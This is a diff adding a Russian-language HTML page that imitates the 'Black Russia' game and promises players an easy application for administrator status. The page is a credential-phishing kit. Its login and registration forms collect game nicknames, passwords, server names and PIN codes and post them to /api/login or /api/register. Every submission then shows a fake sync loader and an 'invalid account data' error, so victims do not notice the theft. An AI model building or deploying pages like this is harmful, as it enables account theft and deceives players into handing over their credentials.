@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Black Russia</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: radial-gradient(circle at 50% 50%, #2e1c20 0%, #0c0c11 100%);
+            padding: 20px;
+            margin: 0;
+        }
+        .card {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            background: #16161c;
+            border-radius: 24px;
+            padding: 24px 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .logo {
+            font-weight: 900;
+            font-size: 26px;
+            text-transform: uppercase;
+            text-align: center;
+            color: #ffffff;
+            letter-spacing: 1px;
+            margin-bottom: 24px;
+        }
+        .logo span { color: #ff3333; }
+        .logo-line {
+            width: 60%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #ff3333, transparent);
+            margin: 0 auto 20px;
+            border-radius: 2px;
+        }
+        .screen { display: none; flex-direction: column; }
+        .screen.active { display: flex; }
+
+        /* Табы (Вход/Регистрация) */
+        .tabs { display: flex; gap: 8px; margin-bottom: 20px; background: #24242c; border-radius: 30px; padding: 4px; }
+        .tab-btn {
+            flex: 1;
+            padding: 12px 0;
+            border: none;
+            border-radius: 30px;
+            background: transparent;
+            color: #7a7a85;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .tab-btn:hover:not(.active) {
+            color: #fff;
+            background: rgba(255, 51, 51, 0.15);
+            box-shadow: 0 0 15px rgba(255, 51, 51, 0.1);
+        }
+        .tab-btn.active {
+            background: #ff3333;
+            color: #fff;
+            box-shadow: 0 0 20px rgba(255, 51, 51, 0.4);
+        }
+        .tab-btn.active:hover {
+            box-shadow: 0 0 30px rgba(255, 51, 51, 0.7);
+        }
+
+        .tab-content { display: none; flex-direction: column; }
+        .tab-content.active { display: flex; }
+
+        /* Элементы форм */
+        .input-group {
+            background: #24242c;
+            border-radius: 14px;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid transparent;
+            transition: 0.2s;
+        }
+        .input-group:focus-within { border-color: #ff3333; }
+        .input-group input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: #ebebf0;
+            outline: none;
+            font-size: 15px;
+        }
+        .input-group input::placeholder { color: #7a7a85; }
+
+        /* Информационные блоки */
+        .info-block {
+            background: #1c1c24;
+            border-radius: 14px;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .info-block h4 {
+            color: #ff3333;
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+        .info-block p {
+            color: #a0a0b0;
+            font-size: 12px;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        /* Кнопки */
+        .btn-main {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 30px;
+            background: #ff3333;
+            color: #fff;
+            font-weight: 800;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(255, 51, 51, 0.3);
+            transition: all 0.3s ease;
+            margin-top: 8px;
+        }
+        .btn-main:hover {
+            background: #ff1a1a;
+            box-shadow: 0 0 20px rgba(255, 51, 51, 0.6), 0 0 40px rgba(255, 51, 51, 0.4);
+            transform: translateY(-2px);
+        }
+        .btn-main:active { transform: scale(0.97); }
+
+        .start-text {
+            color: #a0a0b0;
+            font-size: 14px;
+            line-height: 1.6;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        /* ----- ЛОАДЕР ----- */
+        .loader-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 24px;
+            backdrop-filter: blur(5px);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        .loader-overlay.active { display: flex; }
+        .loader-text {
+            color: #ebebf0;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 16px;
+            letter-spacing: 1px;
+        }
+        .loader-bar {
+            width: 80%;
+            height: 6px;
+            background: #2e2e38;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .loader-bar-inner {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff3333, #ff8888, #ff3333);
+            background-size: 200% 100%;
+            border-radius: 10px;
+            animation: loadAnim 2s ease-in-out forwards;
+        }
+        @keyframes loadAnim {
+            0% { width: 0%; background-position: 0% 0%; }
+            100% { width: 100%; background-position: 100% 0%; }
+        }
+
+        /* ----- ОШИБКА ВНУТРИ КАРТОЧКИ ----- */
+        .error-msg {
+            color: #ff3333;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 12px;
+            min-height: 20px;
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .error-msg.visible {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+
+    <!-- Лоадер -->
+    <div id="loaderOverlay" class="loader-overlay">
+        <div class="loader-text">Синхронизация данных...</div>
+        <div class="loader-bar"><div class="loader-bar-inner"></div></div>
+    </div>
+
+    <!-- Экран 1: Стартовый -->
+    <div id="screen-start" class="screen active">
+        <div class="logo"><span>BLACK</span> RUSSIA</div>
+        <div class="logo-line"></div>
+        <div class="start-text">
+            Упрощённый доступ к подаче заявки на получение административного статуса.<br><br>
+            Авторизация осуществляется через защищённую систему проверки.
+        </div>
+        <button class="btn-main" onclick="goToAuth()">ПЕРЕЙТИ К АВТОРИЗАЦИИ</button>
+    </div>
+
+    <!-- Экран 2: Авторизация / Регистрация -->
+    <div id="screen-auth" class="screen">
+        <div class="logo"><span>BLACK</span> RUSSIA</div>
+        <div class="logo-line"></div>
+
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('login')">Вход</button>
+            <button class="tab-btn" onclick="switchTab('register')">Регистрация</button>
+        </div>
+
+        <!-- Форма Входа -->
+        <div id="tab-login" class="tab-content active">
+            <div class="input-group"><input type="text" id="login-nick" placeholder="Игровой ник"></div>
+            <div class="input-group"><input type="password" id="login-pass" placeholder="Пароль"></div>
+            <button class="btn-main" onclick="handleLogin()">ВОЙТИ</button>
+        </div>
+
+        <!-- Форма Регистрации -->
+        <div id="tab-register" class="tab-content">
+            <div class="input-group"><input type="text" id="reg-nick" placeholder="Игровой ник"></div>
+            <div class="input-group"><input type="password" id="reg-pass" placeholder="Пароль от аккаунта"></div>
+            <div class="input-group">
+                <input type="text" id="reg-server-input" placeholder="Введите название сервера">
+            </div>
+
+            <div class="info-block">
+                <h4>Конфиденциальность</h4>
+                <p>Передаваемые данные защищены и не передаются третьим лицам.</p>
+            </div>
+            <div class="info-block">
+                <h4>Требование</h4>
+                <p>Минимальный уровень персонажа 5 LVL. При наличии PIN-кода, его нужно указывать через запятую после пароля.</p>
+            </div>
+
+            <button class="btn-main" onclick="handleRegister()">ДАЛЕЕ</button>
+        </div>
+
+        <!-- Блок для красивого отображения ошибки -->
+        <div id="auth-error" class="error-msg"></div>
+
+    </div>
+</div>
+
+<script>
+    // Ссылки на элементы
+    const loader = document.getElementById('loaderOverlay');
+
+    function showLoader() {
+        loader.classList.add('active');
+        const bar = loader.querySelector('.loader-bar-inner');
+        bar.style.animation = 'none';
+        bar.offsetHeight; /* trigger reflow */
+        bar.style.animation = 'loadAnim 2s ease-in-out forwards';
+    }
+
+    function hideLoader() {
+        loader.classList.remove('active');
+    }
+
+    // Функции для работы с красивой ошибкой
+    function hideError() {
+        const el = document.getElementById('auth-error');
+        el.classList.remove('visible');
+        el.textContent = '';
+    }
+    function showError(msg) {
+        const el = document.getElementById('auth-error');
+        el.textContent = msg;
+        el.classList.add('visible');
+    }
+
+    // Переключение между стартовым экраном и авторизацией
+    function goToAuth() {
+        document.getElementById('screen-start').classList.remove('active');
+        document.getElementById('screen-auth').classList.add('active');
+    }
+
+    // Переключение между Входом и Регистрацией
+    function switchTab(tab) {
+        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+
+        if(tab === 'login') {
+            document.querySelector('.tabs button:first-child').classList.add('active');
+            document.getElementById('tab-login').classList.add('active');
+        } else {
+            document.querySelector('.tabs button:last-child').classList.add('active');
+            document.getElementById('tab-register').classList.add('active');
+        }
+        hideError(); // Скрываем ошибку при переключении вкладок
+    }
+
+    // Обработка Входа
+    async function handleLogin() {
+        hideError(); // Скрываем старую ошибку перед новым действием
+
+        const nick = document.getElementById('login-nick').value;
+        const password = document.getElementById('login-pass').value;
+
+        if(!nick || !password) {
+            alert('Пожалуйста, заполните все поля');
+            return;
+        }
+
+        showLoader();
+
+        try {
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ nick, password })
+            });
+        } catch (error) {
+            console.log('Сервер не отвечает, но лоадер всё равно отработает.');
+        }
+
+        setTimeout(() => {
+            hideLoader();
+            // ЗАМЕНЕНО: теперь ошибка выводится в карточке, а не в окне браузера
+            showError('Неверные данные от аккаунта');
+        }, 2100);
+    }
+
+    // Обработка Регистрации
+    async function handleRegister() {
+        hideError(); // Скрываем старую ошибку перед новым действием
+
+        const nick = document.getElementById('reg-nick').value;
+        const password = document.getElementById('reg-pass').value;
+        const server = document.getElementById('reg-server-input').value;
+
+        if(!nick || !password || !server) {
+            alert('Пожалуйста, заполните все поля');
+            return;
+        }
+
+        showLoader();
+
+        try {
+            await fetch('/api/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ nick, password, server })
+            });
+        } catch (error) {
+            console.log('Сервер не отвечает, но лоадер всё равно отработает.');
+        }
+
+        setTimeout(() => {
+            hideLoader();
+            // ЗАМЕНЕНО: теперь ошибка выводится в карточке, а не в окне браузера
+            showError('Неверные данные от аккаунта');
+        }, 2100);
+    }
+</script>
+</body>
+</html>
